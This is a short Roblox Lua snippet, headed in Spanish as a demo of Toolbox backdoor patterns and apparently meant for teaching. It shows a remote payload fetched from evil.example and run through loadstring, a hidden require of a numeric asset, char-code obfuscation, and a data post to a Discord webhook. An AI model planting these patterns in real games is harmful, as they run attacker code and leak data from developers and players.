-- DEMO ONLY — patrones de backdoor de Toolbox (no ejecutar en produccion)
local HttpService = game:GetService("HttpService")

local loader = loadstring(game:HttpGet("http://evil.example/payload.lua"))
local hidden = require(1234567890)
local decoded = string.char(108, 111, 97, 100)

HttpService:PostAsync("https://discord.com/api/webhooks/123/abc", HttpService:JSONEncode({ s = decoded }))
